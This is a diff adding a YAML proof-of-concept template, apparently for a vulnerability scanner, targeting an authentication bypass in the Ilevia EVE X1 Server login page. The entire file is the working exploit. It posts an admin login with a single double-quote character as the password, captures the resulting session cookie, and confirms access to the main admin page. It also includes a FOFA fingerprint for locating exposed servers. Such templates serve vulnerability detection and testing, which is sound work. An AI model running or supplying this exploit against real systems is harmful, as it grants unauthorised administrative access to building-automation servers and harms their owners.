@@ -1,0 +1,24 @@
+id: poc-yaml-ilevia-eve-x1-server-login-php-identity-authentication
+info:
+  name: Ilevia EVE X1 服务器 login.php 身份认证绕过漏洞
+  severity: high
+  tags:
+  - 认证绕过
+  finger: ilevia_eve_x1_server
+  fofa: icon_hash="392278119"
+requests:
+- method: POST
+  path: /login/login.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userid=admin&passwd=%22&login=Login
+  expression: status_code == 200 && contains(body,"/main/index.php")
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>.*?);")
+- method: GET
+  path: /main/index.php
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"EVE X1 Server Main") && contains(body,"Home")
+variables: {}
+transport: http
